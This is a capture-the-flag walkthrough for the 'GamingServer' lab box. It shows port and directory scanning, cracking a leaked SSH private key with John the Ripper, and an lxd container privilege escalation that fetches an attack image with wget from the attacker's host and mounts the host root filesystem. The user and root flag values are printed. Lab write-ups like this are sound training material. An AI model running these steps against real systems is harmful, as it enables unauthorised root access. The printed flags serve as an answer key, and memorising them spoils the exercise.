# GamingServer

### #1 	User flag?

Start off with a port scan.
```
nmap -sV -sC <ip>
22/tcp open  ssh
80/tcp open  http
```

Run a scan on the webserver
```
dirbuster

Dir	/secret/	200	1127
File	/secret/secretKey	200	2001
Dir	/uploads/	200	1530
File	/uploads/dict.lst	200	2433
File	/uploads/manifesto.txt	200	3387
```

Using ssh2john
```
ssh2john.py id_rsa theConvertedRsaFile.txt
```
Crack the ssh key with John The Ripper with the password list we found earlyer.
```
sudo john theConvertedRsaFile.txt dict.lst
```

It returned with the password:
```
letmein 
```
Connect to the ssh server using the username and key.
```
ssh -i id_rsa john@<ip>
```
Use the password we got with JohnTheRipper and we're in.

```
cat /home/john/user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

### #2 What is the root flag?

Check what we can do as root
```
sudo -l
```

lxd is exposed, so we create a image with alpine.

Host a webserver at the attack shell.
```
python3 -m http.server
```
Use wget to download the image we created
```
wget <myip>:8000/theImage.tar.gz
```

After we have downloaded the image, exploit lxc.
```
lxc image import filename --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

We are now root and can cat out the root flag. Remember we are still inside the container so the filesystem is inside /mnt/root
```
cat mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
